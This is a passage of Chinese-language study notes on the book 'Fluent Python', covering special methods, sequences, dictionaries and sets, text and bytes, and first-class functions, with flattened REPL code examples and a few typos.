self._cards[position] 上面这个代码示例惊艳到我了，让我对 Python 的类刮目相看；此刻我才开始开始意识到内置方法的存在； 例如它仅仅因为实现了 _len_ 和 _getitem_ 两个特殊方法，便使得这个类能够自动使用 Python 的内置函数，例如 1234567891011121314151617181920212223242526272829303132# 使用 len 函数获得数量 deck = FrenchDeck() len(deck)# 使用索引访问列表中的元素deck[0]deck[-1]# 使用内置的标准库，例如 random，从列表中随机读取元素from random import choicechoice(deck)# 自动支持切片操作deck[:3]deck[12::13]# 自动可迭代for card in deck: print(card) # 自动支持 in 运算符Card(&quot;Q&quot;, &quot;hearts&quot;) in deck# 只需定义排序规则，即可自动支持内置的 sorted 排序函数suit_values = dict(spades=3, hearts=2, diamonds=1, clubs=0)def spades_high(card): rank_value = FrenchDeck.rands.index(card.rand) return rank_value * len(suit_values) + suite_values[card.suit]for card in sorted(deck, key = spades_high): print(card) 如何使用特殊方法特殊方法是为了给解释器调用，从而实现一些内置的功能，而不是为了自己调用；如果是自己调用，那么只需写普通方法即可，无须写特殊方法； 另外，也尽量避免随意添加特殊方法，因为有可能出解释器内置的方法出现命名冲突，导致发生不可预知的情况； 特殊方法还可以用来重载运算符，例如转成字符串，加号，乘号，取绝对值等，示例如下： 1234567891011121314151617181920212223242526from math import hypotclass Vector: def __init__(self, x=0, y=0): self.x = x self.y = y # repr 用来定义对象用字符串如何显示，另外还有一个 str 用来给 str() 或者 print 函数调用 # 通常定义 repr 即可，它更加通用 def __repr__(self): return &#x27;Vector(%r, %r)&#x27; % (self.x, self.y) def __abs__(self): # 重载了 abs 函数 return hypot(self.x, self.y) def __bool__(self): # 当调用 bool 函数时，如何判断对象是否为真 return bool(self.x or self.y) def __add__(self, other): # 重载了加号 x = self.x + other.x y = self.y + other.y return Vector(x, y) def __mul__(self, scalar): # 重载了乘号 return Vector(self.x * scalar, self.y * scalar) 特殊方法一览特殊方法挺多的，有80 多个，其中有 40 个多用于实现算术运算、位运算和比较操作； 为什么 len 不是普通 方法len 的目的是为了读取对象的长度，对于内置类型的对象，它们是用 C 语言的 struct 表示的，struct 里面有个属性存储着长度值，因此在这种情况下，len 会直接去读取 struct 的长度值，而不是调用 _len_ 来计算长度；主要是出于性能考量 本章小结通过实现特殊方法，能够让自定义类型表现跟内置类型一样，从而能够直接使用 Python 的很多内置函数，让代码更容易阅读； 第2章 序列构成的数组内置序列类型Python 有两种序列类型，一种存放的是对象的引用，因此它可以容纳任何类型，称为容器序列；一种存放值，而不是引用，因此只能放相同类型的值，称为扁平序列； 序列按照能否修改，可分为可变序列和不可变序列 可变序列（Mutable Sequence）：list, bytearray, array.array, collections.deque, memoryview 不可变序列（Sequence）：tuple, str, bytes 列表推导和生成器表达式列表推导式（list comprehension）非常适合用来创建新的列表，这种写法更容易读懂；如果列表推导太长，则可以改用传统的 for 循环； 123456&gt;&gt;&gt; colors = [&#x27;black&#x27;, &#x27;white&#x27;]&gt;&gt;&gt; sizes = [&#x27;S&#x27;, &#x27;M&#x27;, &#x27;L&#x27;]&gt;&gt;&gt; tshirts = [(color, size) for color in colors for size in sizes]&gt;&gt;&gt; tshirts[(&#x27;black&#x27;, &#x27;S&#x27;), (&#x27;black&#x27;, &#x27;M&#x27;), (&#x27;black&#x27;, &#x27;L&#x27;), (&#x27;white&#x27;, &#x27;S&#x27;),(&#x27;white&#x27;, &#x27;M&#x27;), (&#x27;white&#x27;, &#x27;L&#x27;)] 生成器表达式用来其他类型的序列；生成器表达式使用圆括号，而不是方括号； 123&gt;&gt;&gt; symbols = &#x27;$¢£¥€¤&#x27;&gt;&gt;&gt; tuple(ord(symbol) for symbol in symbols) # 由于生成器表达式是函数的唯一参数，所以无需用括号括起来(36, 162, 163, 165, 8364, 164) 123&gt;&gt;&gt; import array&gt;&gt;&gt; array.array(&#x27;I&#x27;, (ord(symbol) for symbol in symbols)) # 非唯一参数，所以多加了一层括号array(&#x27;I&#x27;, [36, 162, 163, 165, 8364, 164]) 生成器表达式每次产生一个运算结果，而不是一下生成整个列表，这样可以节省内存，尤其是元素多的时候，非常明显 1234567891011&gt;&gt;&gt; colors = [&#x27;black&#x27;, &#x27;white&#x27;]&gt;&gt;&gt; sizes = [&#x27;S&#x27;, &#x27;M&#x27;, &#x27;L&#x27;]&gt;&gt;&gt; for tshirt in (&#x27;%s %s&#x27; % (c, s) for c in colors for s in sizes): # 一次只生成一个计算结果，而非整个列表... print(tshirt)...black Sblack Mblack Lwhite Swhite Mwhite L 元组不仅仅是不可变的列表元组是不可变列表，但其实它存放的数据，也可以基于顺序来表达不同的含义 12traveler_ids = [(&#x27;USA&#x27;, &#x27;31195855&#x27;), (&#x27;BRA&#x27;, &#x27;CE342567&#x27;), (&#x27;ESP&#x27;, &#x27;XDA205856&#x27;)]# 位置1是国家，位置2是代号 12&gt;&gt;&gt; lax_coordinates = (33.9425, -118.408056)&gt;&gt;&gt; latitude, longitude = lax_coordinates # 元组拆包 12&gt;&gt;&gt; b, a = a, b# 使用拆包，实现变量的值交换 1234&gt;&gt;&gt; divmod(20, 8)(2, 4)&gt;&gt;&gt; t = (20, 8)&gt;&gt;&gt; divmod(*t) # 星号 * 可用来将元组拆包成函数的函数 星号* 可用来存放拆包的余下元素 12345678910111213141516171819&gt;&gt;&gt; a, b, *rest = range(5) # 星号 * 用来存放剩余元素&gt;&gt;&gt; a, b, rest(0, 1, [2, 3, 4]) &gt;&gt;&gt; a, b, *rest = range(3)&gt;&gt;&gt; a, b, rest(0, 1, [2])&gt;&gt;&gt; a, b, *rest = range(2)&gt;&gt;&gt; a, b, rest(0, 1, [])# 放在中间的位置也可以&gt;&gt;&gt; a, *body, c, d = range(5)&gt;&gt;&gt; a, body, c, d(0, [1, 2], 3, 4)# 放在开头的位置也可以&gt;&gt;&gt; *head, b, c, d = range(5)&gt;&gt;&gt; head, b, c, d([0, 1], 2, 3, 4) 嵌套元组拆包1234567891011metro_areas = [ (&#x27;Tokyo&#x27;,&#x27;JP&#x27;,36.933,(35.689722,139.691667)), # 嵌套的元组 (&#x27;Delhi NCR&#x27;, &#x27;IN&#x27;, 21.935, (28.613889, 77.208889)), (&#x27;Mexico City&#x27;, &#x27;MX&#x27;, 20.142, (19.433333, -99.133333)), (&#x27;New York-Newark&#x27;, &#x27;US&#x27;, 20.104, (40.808611, -74.020386)), (&#x27;Sao Paulo&#x27;, &#x27;BR&#x27;, 19.649, (-23.547778, -46.635833)),]for name, cc, pop, (latitude, longitude) in metro_areas: # 嵌套拆包 if longitude &lt;= 0: print(fmt.format(name, latitude, longitude)) 具名元组123456789101112&gt;&gt;&gt; from collections import namedtuple&gt;&gt;&gt; City = namedtuple(&#x27;City&#x27;, &#x27;name country population coordinates&#x27;) # 定义元组结构&gt;&gt;&gt; tokyo = City(&#x27;Tokyo&#x27;, &#x27;JP&#x27;, 36.933, (35.689722, 139.691667)) # 赋值&gt;&gt;&gt; tokyoCity(name=&#x27;Tokyo&#x27;, country=&#x27;JP&#x27;, population=36.933, coordinates=(35.689722,139.691667)) # 各个&gt;&gt;&gt; tokyo.population ➌36.933&gt;&gt;&gt; tokyo.coordinates(35.689722, 139.691667)&gt;&gt;&gt; tokyo[1]&#x27;JP&#x27; 具名元组有一些内置的属性和方法，包括： _fields 属性，用来查看所有字段的名称 _make() 方法，用来创建实例 _asdict() 方法，用来返回 OrderDict 1234567&gt;&gt;&gt; City._fields (&#x27;name&#x27;, &#x27;country&#x27;, &#x27;population&#x27;, &#x27;coordinates&#x27;)&gt;&gt;&gt; LatLong = namedtuple(&#x27;LatLong&#x27;, &#x27;lat long&#x27;)&gt;&gt;&gt; delhi_data = (&#x27;Delhi NCR&#x27;, &#x27;IN&#x27;, 21.935, LatLong(28.613889, 77.208889))&gt;&gt;&gt; delhi = City._make(delhi_data) &gt;&gt;&gt; delhi._asdict() OrderedDict([(&#x27;name&#x27;, &#x27;Delhi NCR&#x27;), (&#x27;country&#x27;, &#x27;IN&#x27;), (&#x27;population&#x27;, 21.935), (&#x27;coordinates&#x27;, LatLong(lat=28.613889, long=77.208889))]) 相对列表，元组没有添加和删除元素的方法，其他方法则都差不多； 切片切片有个特殊的用法，即 s[a : b : c]，它表示在 a ~ b 的区间内，以 c 为间隔取值；即 s[start : stop : step] 123456789&gt;&gt;&gt; s = &#x27;bicycle&#x27;&gt;&gt;&gt; s[::3] # 正序，间隔 3 取值&#x27;bye&#x27;&gt;&gt;&gt; s[::-1] # 倒序，间隔 1 取值&#x27;elcycib&#x27;&gt;&gt;&gt; s[::-2] # 倒序，间隔 2 取值&#x27;eccb&#x27;&gt;&gt;&gt; deck[12::13] # 正序，从 12 开始，间隔 13 取值， 切片有个很有意思的用法，它可以让代码更易读 12345678910111213&gt;&gt;&gt; SKU = slice(0, 6)&gt;&gt;&gt; DESCRIPTION = slice(6, 40)&gt;&gt;&gt; UNIT_PRICE = slice(40, 52)&gt;&gt;&gt; QUANTITY = slice(52, 55)&gt;&gt;&gt; ITEM_TOTAL = slice(55, None)&gt;&gt;&gt; for item in line_items:... print(item[UNIT_PRICE], item[DESCRIPTION]) # 此处的 UNIT_PRICE 也可硬编码，但这样写更优雅...$17.50 Pimoroni PiBrella$4.95 6mm Tactile Switch x20$28.00 Panavise Jr. - PV-201$34.95 PiTFT Mini Kit 320x240 切片也可用来赋值，或者删除 12345678910111213141516171819&gt;&gt;&gt; l = list(range(10))&gt;&gt;&gt; l[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]&gt;&gt;&gt; l[2:5] = [20, 30] # 赋值&gt;&gt;&gt; l[0, 1, 20, 30, 5, 6, 7, 8, 9]&gt;&gt;&gt; del l[5:7] # 删除&gt;&gt;&gt; l[0, 1, 20, 30, 5, 8, 9]&gt;&gt;&gt; l[3::2] = [11, 22] # 赋值&gt;&gt;&gt; l[0, 1, 20, 11, 5, 22, 9]&gt;&gt;&gt; l[2:5] = 100 # 不可行，右侧需要是可迭代对象，不能是数值Traceback (most recent call last):File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: can only assign an iterable&gt;&gt;&gt; l[2:5] = [100] # 可行&gt;&gt;&gt; l[0, 1, 100, 22, 9] 对序列使用 + 和 *加号 + 用来表示将两个序列拼接起来，并返回一个新的序列； 乘号 * 表示重复多份序列并拼接起来 12345&gt;&gt;&gt; l = [1, 2, 3]&gt;&gt;&gt; l * 5[1, 2, 3, 1, 2, 3, 1, 2, 3, 1, 2, 3, 1, 2, 3]&gt;&gt;&gt; 5 * &#x27;abcd&#x27;&#x27;abcdabcdabcdabcdabcd&#x27; 特别注意，在 [a] * n 这个表达式中，如果 a 是一个引用，那么复制出来的是 n 个引用，并且这 n 个引用实际上指向同一个对象； 123456789101112131415# 正确用法，使用列表推导式&gt;&gt;&gt; board = [[&#x27;_&#x27;] * 3 for i in range(3)] &gt;&gt;&gt; board[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;]]&gt;&gt;&gt; board[1][2] = &#x27;X&#x27; &gt;&gt;&gt; board[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;X&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;]]# 错误用法&gt;&gt;&gt; weird_board = [[&#x27;_&#x27;] * 3] * 3 &gt;&gt;&gt; weird_board[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;]]&gt;&gt;&gt; weird_board[1][2] = &#x27;O&#x27; &gt;&gt;&gt; weird_board[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;O&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;O&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;O&#x27;]] # 虽然有三个列表，但指向同一个对象 序列的增量赋值自增 +&#x3D; 或者自乘 *&#x3D; 实际上调用的是 _iadd_ 和 _imul_ 方法，如果一个类没有实际 iadd 方法，那么解释器就会调用 add 方法来计算，此时相当于 a &#x3D; a + b，因此，如果 a + b 返回的是一个新的对象，那么 a 将指向该新的对象，而不是改变旧对象的值； 12345678&gt;&gt;&gt; l = [1, 2, 3]&gt;&gt;&gt; id(l)4311953800 ➊&gt;&gt;&gt; l *= 2&gt;&gt;&gt; l[1, 2, 3, 1, 2, 3]&gt;&gt;&gt; id(l)4311953800 ➋ 元组是不可变的，当在元组里面放入一个可变序列时，会出现异常情况，即该可变序列可被改变，但是无法将改变后的新序列，赋值给元组的引用； 1234567&gt;&gt;&gt; t = (1, 2, [30, 40])&gt;&gt;&gt; t[2] += [50, 60]Traceback (most recent call last):File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: &#x27;tuple&#x27; object does not support item assignment # 赋值给 t[2] 的时候报错了&gt;&gt;&gt; t(1, 2, [30, 40, 50, 60]) # 成功改变了序列 list.sort 方法和内置函数 sortedlist.sort 会就地修改列表，返回 None sorted 则不会修改原列表，而是会返回一个新的列表； 用 bisect 来管理已排序的序列bisect 用来从有序列表中查找某个值的插入位置，满足插入后原序列的顺序不变； insort 用来将元素插入到有序列表中，插入后顺序保持不变； 当列表不是首选时数组array.array：数组里面存储的不是对象，而是字面值（例如数字，在内存中直接用字节表示即可）；因此它的读定性能要高很多；但因此它能够存储的类型也比较有限，只有少数几种； 创建数组时，需要通过参数指定类型，以便解释器能够决定如何分配内存空间； 内存视图 memory view 在不复制内容的情况下，操作数组的切片，例如 Numpy； 123456789101112&gt;&gt;&gt; numbers = array.array(&#x27;h&#x27;, [-2, -1, 0, 1, 2])&gt;&gt;&gt; memv = memoryview(numbers) &gt;&gt;&gt; len(memv)5&gt;&gt;&gt; memv[0] -2&gt;&gt;&gt; memv_oct = memv.cast(&#x27;B&#x27;) &gt;&gt;&gt; memv_oct.tolist() [254, 255, 255, 255, 0, 0, 1, 0, 2, 0]&gt;&gt;&gt; memv_oct[5] = 4 # 此处的赋值，改变的是高位字节部分&gt;&gt;&gt; numbersarray(&#x27;h&#x27;, [-2, -1, 1024, 1, 2]) # 原本的 0，因为高位字节改变，变成了 1024 Numpy 和 SciPy操作高阶数组和矩阵的利器； 12345678910111213&gt;&gt;&gt; import numpy ➊&gt;&gt;&gt; a = numpy.arange(12) ➋&gt;&gt;&gt; aarray([ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])&gt;&gt;&gt; type(a)&lt;class &#x27;numpy.ndarray&#x27;&gt;&gt;&gt;&gt; a.shape ➌(12,)&gt;&gt;&gt; a.shape = 3, 4 ➍&gt;&gt;&gt; aarray([[ 0, 1, 2, 3],[ 4, 5, 6, 7],[ 8, 9, 10, 11]]) 双向队列和其他形式的队列虽然可以用列表在模拟队列，但是性能并不好，尤其是在头部插入新元素时；双向队列更方便，而且可以指定长度，在超出长度时，会自动删除较早的内容； 12345678910111213141516171819&gt;&gt;&gt; from collections import deque&gt;&gt;&gt; dq = deque(range(10), maxlen=10) ➊&gt;&gt;&gt; dqdeque([0, 1, 2, 3, 4, 5, 6, 7, 8, 9], maxlen=10)&gt;&gt;&gt; dq.rotate(3) # 旋转，将最后3个元素，放到前面来&gt;&gt;&gt; dqdeque([7, 8, 9, 0, 1, 2, 3, 4, 5, 6], maxlen=10)&gt;&gt;&gt; dq.rotate(-4) # 将头部 4 个元素，放到后面去&gt;&gt;&gt; dqdeque([1, 2, 3, 4, 5, 6, 7, 8, 9, 0], maxlen=10)&gt;&gt;&gt; dq.appendleft(-1) # 添加到头部，会自动删除尾部溢出的部分&gt;&gt;&gt; dqdeque([-1, 1, 2, 3, 4, 5, 6, 7, 8, 9], maxlen=10)&gt;&gt;&gt; dq.extend([11, 22, 33]) # 添加到尾部，会删除头部溢出的部分&gt;&gt;&gt; dqdeque([3, 4, 5, 6, 7, 8, 9, 11, 22, 33], maxlen=10)&gt;&gt;&gt; dq.extendleft([10, 20, 30, 40]) # 逐一添加到头部，因此顺序会反过来&gt;&gt;&gt; dqdeque([40, 30, 20, 10, 3, 4, 5, 6, 7, 8], maxlen=10) 注：append 和 popleft 是原子操作，因此是线程安全的； 除了双向队列，还有以下几种队列，分别是： queue：如果队列满了，不会自动删除旧元素，而是会被锁住；因此可用来控制活跃线程的数量； multiprocessing：用于进程间的通信 asyncio：用于异步编程 heapq：堆队列 第3章 字典和集合字典构造方法 如果一个对象是可散列的，那么它的散列值需要不可变，而且这个对象需要实现 hash 和 eq 方法，以便可以计算散列值并和其他对象做比较； 字典有很多种构造方法 1234567&gt;&gt;&gt; a = dict(one=1, two=2, three=3)&gt;&gt;&gt; b = &#123;&#x27;one&#x27;: 1, &#x27;two&#x27;: 2, &#x27;three&#x27;: 3&#125;&gt;&gt;&gt; c = dict(zip([&#x27;one&#x27;, &#x27;two&#x27;, &#x27;three&#x27;], [1, 2, 3]))&gt;&gt;&gt; d = dict([(&#x27;two&#x27;, 2), (&#x27;one&#x27;, 1), (&#x27;three&#x27;, 3)])&gt;&gt;&gt; e = dict(&#123;&#x27;three&#x27;: 3, &#x27;one&#x27;: 1, &#x27;two&#x27;: 2&#125;)&gt;&gt;&gt; a == b == c == d == eTrue 字典推导字典可以从任何以键值对作为元素的可迭代对象中构造出来 1234567891011121314151617181920&gt;&gt;&gt; DIAL_CODES = [ ➊... (86, &#x27;China&#x27;),... (91, &#x27;India&#x27;),... (1, &#x27;United States&#x27;),... (62, &#x27;Indonesia&#x27;),... (55, &#x27;Brazil&#x27;),... (92, &#x27;Pakistan&#x27;),... (880, &#x27;Bangladesh&#x27;),... (234, &#x27;Nigeria&#x27;),... (7, &#x27;Russia&#x27;),... (81, &#x27;Japan&#x27;),... ]&gt;&gt;&gt; country_code = &#123;country: code for code, country in DIAL_CODES&#125; # 构造1 country : code&gt;&gt;&gt; country_code&#123;&#x27;China&#x27;: 86, &#x27;India&#x27;: 91, &#x27;Bangladesh&#x27;: 880, &#x27;United States&#x27;: 1,&#x27;Pakistan&#x27;: 92, &#x27;Japan&#x27;: 81, &#x27;Russia&#x27;: 7, &#x27;Brazil&#x27;: 55, &#x27;Nigeria&#x27;:234, &#x27;Indonesia&#x27;: 62&#125;&gt;&gt;&gt; &#123;code: country.upper() for country, code in country_code.items() # 构造2 code : country ... if code &lt; 66&#125;&#123;1: &#x27;UNITED STATES&#x27;, 55: &#x27;BRAZIL&#x27;, 62: &#x27;INDONESIA&#x27;, 7: &#x27;RUSSIA&#x27;&#125; 常见的映射方法有个 setdefault 方法不常用，但其实很不错。它的用法如下 1234&gt;&gt;&gt; a = &#123;&quot;abc&quot;: 123&#125;&gt;&gt;&gt; b = a.setdefault(&quot;abc&quot;, 456) # 如果 abc 没值，则赋值456；如果有值，则返回值&gt;&gt;&gt; b123 映射的弹性键查询通常情况下，当我们使用 dict[key] 的方式访问时，如果该 key 不存在，会出现报错；而 collencts.defaultdict 可以处理这种情况；它会将该键为一个预先设定好的默认值，并返回该值 123456789101112import sysimport reimport collectionsWORD_RE = re.compile(r&#x27;\\w+&#x27;)index = collections.defaultdict(list) # list 代表默认的构造方法，如键不存在，则会调用该构造方法，构造默认值with open(sys.argv[1], encoding=&#x27;utf-8&#x27;) as fp: for line_no, line in enumerate(fp, 1): for match in WORD_RE.finditer(line): word = match.group() column_no = match.start()+1 location = (line_no, column_no) index[word].append(location) defaultdict 仅在 dict[key] 下有效，在 dict.get(key) 是无效的，后者不会调用预设的工作方法；defaultdict 背后的工作原理是因为实现了 _missing_ 方法；当 _getitem_ 找不到键名时，默认会调用 missing 方法；因此，只要有实现该方法，即可以实现默认值的初始化和返回； 考虑到 missing 会被调用，那么就可以在这里设置手脚；例如将键名由数值转换字符串，以支持不管传入哪种类型，都可以找到对应的键； 字典的变种collections.OrderDict会记录每个键的添加顺序，然后可以删除最晚或者晚早添加的键； collections.ChainMapChainMap 会将多个 dict 组合成一个 chain，让它表现起来，像是一个 dict 12345678910111213&gt;&gt;&gt; baseline = &#123;&#x27;music&#x27;: &#x27;bach&#x27;, &#x27;art&#x27;: &#x27;rembrandt&#x27;&#125;&gt;&gt;&gt; adjustments = &#123;&#x27;art&#x27;: &#x27;van gogh&#x27;, &#x27;opera&#x27;: &#x27;carmen&#x27;&#125;&gt;&gt;&gt; cm = ChainMap(baseline, adjustments)&gt;&gt;&gt; cmChainMap(&#123;&#x27;music&#x27;: &#x27;bach&#x27;, &#x27;art&#x27;: &#x27;rembrandt&#x27;&#125;, &#123;&#x27;art&#x27;: &#x27;van gogh&#x27;, &#x27;opera&#x27;: &#x27;carmen&#x27;&#125;)&gt;&gt;&gt; list(cm)[&#x27;art&#x27;, &#x27;opera&#x27;, &#x27;music&#x27;]&gt;&gt;&gt; cm[&#x27;music&#x27;]&#x27;bach&#x27;&gt;&gt;&gt; cm[&#x27;art&#x27;]&#x27;rembrandt&#x27;&gt;&gt;&gt; cm.values()ValuesView(ChainMap(&#123;&#x27;music&#x27;: &#x27;bach&#x27;, &#x27;art&#x27;: &#x27;rembrandt&#x27;&#125;, &#123;&#x27;art&#x27;: &#x27;van gogh&#x27;, &#x27;opera&#x27;: &#x27;carmen&#x27;&#125;)) collections.Counter12345678&gt;&gt;&gt; ct = collections.Counter(&#x27;abracadabra&#x27;)&gt;&gt;&gt; ctCounter(&#123;&#x27;a&#x27;: 5, &#x27;b&#x27;: 2, &#x27;r&#x27;: 2, &#x27;c&#x27;: 1, &#x27;d&#x27;: 1&#125;) # 计算每个键的出现次数&gt;&gt;&gt; ct.update(&#x27;aaaaazzz&#x27;) # update 会递增键的出现次数&gt;&gt;&gt; ctCounter(&#123;&#x27;a&#x27;: 10, &#x27;z&#x27;: 3, &#x27;b&#x27;: 2, &#x27;r&#x27;: 2, &#x27;c&#x27;: 1, &#x27;d&#x27;: 1&#125;)&gt;&gt;&gt; ct.most_common(2) # 可以返回最常见的 n 个键，此处是最常见的 2 个键[(&#x27;a&#x27;, 10), (&#x27;z&#x27;, 3)] 12345&gt;&gt;&gt; cnt = Counter()&gt;&gt;&gt; for word in [&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;red&#x27;, &#x27;green&#x27;, &#x27;blue&#x27;, &#x27;blue&#x27;]:&gt;&gt;&gt; cnt[word] += 1&gt;&gt;&gt; cntCounter(&#123;&#x27;blue&#x27;: 3, &#x27;red&#x27;: 2, &#x27;green&#x27;: 1&#125;) collections.UserDict用于让用户继承来编写子类，与 dict 的不同之处在于它是纯 Python 实现；而 dict 为了性能，某些功能的实现并不完全按照规范； 子类化 UserDict123456789101112131415import collections# 实现 dict[key] 不管 key 是字符串还是数字，都可以正常访问class StrKeyDict(collections.UserDict): def __missing__(self, key): if isinstance(key, str): raise KeyError(key) return self[str(key)] def __contains__(self, key): return str(key) in self.data def __setitem__(self, key, item): self.data[str(key)] = item 一些好用的方法 update 123456&gt;&gt;&gt; td1 = &#123;&#x27;name&#x27;: &#x27;Zara&#x27;, &#x27;age&#x27;: 7&#125;&gt;&gt;&gt; td2 = &#123;&#x27;sex&#x27;: &#x27;female&#x27;&#125;&gt;&gt;&gt; td1.update(td2)&gt;&gt;&gt; td1&#123;&#x27;name&#x27;: &#x27;Zara&#x27;, &#x27;age&#x27;: 7, &#x27;sex&#x27;: &#x27;female&#x27;&#125;&gt;&gt;&gt; 不可变映射类型Python 的标准库并不支持不可变映射类型，但是有个变通的办法来实现相同的效果，即通过 MappingProxyType，从名字可以看得出来它是一个代理，这个代理是只读的； 12345678910111213141516171819&gt;&gt;&gt; from types import MappingProxyType&gt;&gt;&gt; d = &#123;1:&#x27;A&#x27;&#125;&gt;&gt;&gt; d_proxy = MappingProxyType(d) # 创建一个代理&gt;&gt;&gt; d_proxymappingproxy(&#123;1: &#x27;A&#x27;&#125;)&gt;&gt;&gt; d_proxy[1] # 代理是可以访问的&#x27;A&#x27;&gt;&gt;&gt; d_proxy[2] = &#x27;x&#x27; # 但是不可以修改，会报错Traceback (most recent call last):File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: &#x27;mappingproxy&#x27; object does not support item assignment&gt;&gt;&gt; d[2] = &#x27;B&#x27;&gt;&gt;&gt; d_proxy # 代理可以实时的看到 d 更新后的效果mappingproxy(&#123;1: &#x27;A&#x27;, 2: &#x27;B&#x27;&#125;)&gt;&gt;&gt; d_proxy[2]&#x27;B&#x27; 集合论集合 set 是一些对象的集合，它可以用来去重；集合中的元素必须是可散列的； 12345&gt;&gt;&gt; l = [&#x27;spam&#x27;, &#x27;spam&#x27;, &#x27;eggs&#x27;, &#x27;spam&#x27;]&gt;&gt;&gt; set(l)&#123;&#x27;eggs&#x27;, &#x27;spam&#x27;&#125;&gt;&gt;&gt; list(set(l))[&#x27;eggs&#x27;, &#x27;spam&#x27;] 集合有一些自己的运算符，以便计算合集、交集、差集等； 12# 用 &amp; 符号求交集found = len(needles &amp; haystack) 集合字面量创建空集需要使用 set()， 而不是 { }，不然就变成了字典了； s1 &#x3D; {1, 2, 3} 的性能比 s2 &#x3D; set([1, 2, ,3])，因为后者涉及先构造列表的动作； 集合推导集合推导和列表推导的唯一差别在于方括号 [ ] 还是花括号 { } 1234&gt;&gt;&gt; from unicodedata import name ➊&gt;&gt;&gt; &#123;chr(i) for i in range(32, 256) if &#x27;SIGN&#x27; in name(chr(i),&#x27;&#x27;)&#125; ➋&#123;&#x27;§&#x27;, &#x27;=&#x27;, &#x27;¢&#x27;, &#x27;#&#x27;, &#x27;¤&#x27;, &#x27;&lt;&#x27;, &#x27;¥&#x27;, &#x27;μ&#x27;, &#x27;×&#x27;, &#x27;$&#x27;, &#x27;¶&#x27;, &#x27;£&#x27;, &#x27;©&#x27;,&#x27;°&#x27;, &#x27;+&#x27;, &#x27;÷&#x27;, &#x27;±&#x27;, &#x27;&gt;&#x27;, &#x27;¬&#x27;, &#x27;®&#x27;, &#x27;%&#x27;&#125; 集合的操作集合有不少专属的操作，这些操作很多是通过对运算符的重载来实现的； dict 和 set 背后dict 和 set 背后的实现原理是散列，这样性能就不会因为元素数量的增长出现大多波动；散列本质上是以空间换时间；列表则是以时间换空间； dict 的实现及其结果 注：所有由用户自定义的对象，都是可散列的；因为它的散列值是由 id() 来生成的，跟对象本身的值没有关系。因此所有这些自定义对象，即使值相同，由于 id 不同，它们也是不相等的； 相比列表，元组会比较节省空间；一方面是因为它无须重复存储键名，另一方面是它不需要用到散列； 应避免在迭代的过程中，对字典进行修改，它会给迭代带来扰乱，有可能导致出错，或者结果错乱； 字典 dict 是不可散列的，所以无法直接将 dict 添加到 set 中； 字典 dict 的键名顺序是有可能会变化的，例如当出现散列冲突时或者扩容时； 第4章 文本和字节序列字符问题在 Python3，字符统一使用 Unicode 进行表示（称为码位），这样能够涵盖所有的已知字符，而且这个字符的 Unicode 也是固定的；但是在存储的时候，可以有多种编码方法（将码位转成字节序列），例如 UTF8, UTF16 等；使用不同的编码方法存储，就需要使用相应的解码方法读取，这样出来的结果才是正确的； 字节概要在 Python3，有 bytes 和 bytearray 两种字节序列类型，其内部的元素是 0~255 的整数； bytes[0]，返回一个元素； bytes[:1]，返回一个切片，即一段新的序列 虽然二进制序列在底层是整数序列，但是显示的字面量有多种可能，包括： ASCII 字符 制表符、换行符、回车符、斜杠等特殊符号； 十六进制转义表示 1b&#x27;caf\\xc3\\xa9&#x27; # caf 刚好可以用 Ascii 表示，后来两个只能用十六进制表示 基本的编解码器了解编解码问题处理文本文件为了正确比较而规范化 Unicode 字符串Unicode 文本排序Unicode 数据库支持字符串和字节序列的双模式 API第5章 一等函数把函数视为对象first class 函数满足以下条件： 能够在运行时创建 能够赋值给变量或者数据结构中的元素； 能够做为参数传递给函数； 能够做为结果从函数调用中返回； 简而言之，函数就像一个对象一样（事实上在底层实现也是如此，函数即对象）； 高阶函数高阶函数：higher-order function，接受函数做为参数，或者返回结果为参数； 常用的 map 和 filter，可以用列表推导式和生成器表达式进行替代，看起来更容易理解，示例如下： 12345map(func, range(6))[func(i) for i in range(6)]filter(lambda n : n % 2, range(6))[i for i in range(6) if i % 2] 匿名函数由于 python 的 lambda 函名函数只能写单行的表达式，因此表达能力非常有限，导致使用场景非常少；常用于高阶函数的函数参数；类似下面这个样子 1filter(lambda n : n % 2, range(6)) 可调用对象调用运算符，即一对括号，不仅可以运用在函数上，其实也可以运用在普通对象上； 可用 callable 函数来判断某个对象是否可以调用 用户定义的可调用类型事实上所有对象都是可以调用的，只要对象有实现 call 方法即可； 函数内省 函数内省，function introspection，这个翻译名称有点奇怪； 由于函数是一个对象，因此其实这个对象内部存储着很多与函数有关的信息，示例如下： 从定位参数到仅限关键字参数python 的函数参数处理机制非常灵活强大，既支持固定位置的参数形式，也支持按关键字进行匹配的参数形式。同时还支持使用 * 单星号或者 ** 双星号，将不固定数量的任意个参数，打包成一个可迭代对象，以便在函数体内部进行访问；其中单个星号打包成 tuple 元组的形式；两个星号打包成字典 dict 的形式； 获取关于参数的信息函数内部的属性，可用来做一起有用的事情，示例如下： 此处使用了装饰器，装饰器会检查 hello 函数内部属性中存储的与参数有关的信息。检查后，它会发现 hello 函数需要一个 person 函数；因此，它可以用 query 对象中，获取相应的 person 值，然后作为参数，传递给 hello 函数； _default_ 存储函数参数的默认值； _code_ 是一个对象，它也存储着函数的相关信息，例如： co_varnames 存储着参数名称 + 局部变量名称 co_argcount 存储着函数的参数个数； 直接访问 code 对象或者 default 不是很方便，不过有个 inspect 库提供了方便的查看方式； 函数注解函数注解可用来给参数和返回值备注类型 12def clip(text:str, max_len:&#x27;int &gt; 0&#x27;=80) 